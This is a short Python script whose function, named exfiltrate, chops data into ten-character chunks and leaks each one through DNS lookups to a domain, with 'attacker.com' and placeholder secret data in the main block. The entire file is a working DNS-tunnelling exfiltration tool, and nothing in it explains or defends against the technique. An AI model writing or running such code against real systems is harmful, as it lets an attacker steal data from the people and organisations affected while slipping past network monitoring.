import dns.resolver

def exfiltrate(data, domain):
    for i, chunk in enumerate([data[i:i+10] for i in range(0, len(data), 10)]):
        query = f"{chunk}.{i}.{domain}"
        try:
            dns.resolver.resolve(query, "A")
        except Exception:
            pass

if __name__ == "__main__":
    exfiltrate("secret_data_here", "attacker.com")